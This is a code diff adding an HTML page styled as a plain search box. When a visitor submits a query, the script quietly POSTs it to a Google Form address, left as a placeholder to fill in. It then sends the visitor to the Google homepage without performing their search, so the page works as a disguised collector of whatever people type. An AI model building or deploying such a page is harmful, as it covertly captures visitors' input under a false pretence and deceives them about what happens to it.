@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Search</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #fff;
+    }
+    input {
+      width: 80%;
+      max-width: 400px;
+      padding: 14px;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 24px;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <form id="searchForm">
+    <input type="text" id="query" placeholder="Search anything…" required>
+  </form>
+
+  <script>
+    const form = document.getElementById('searchForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const q = document.getElementById('query').value;
+
+      // REPLACE THIS with your Google Form POST URL (next step)
+      const formUrl = "PASTE_FORM_POST_URL_HERE";
+
+      fetch(formUrl, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "entry.XXXXXXXX=" + encodeURIComponent(q)
+      });
+
+      window.location.href = "https://www.google.com";
+    });
+  </script>
+</body>
+</html>
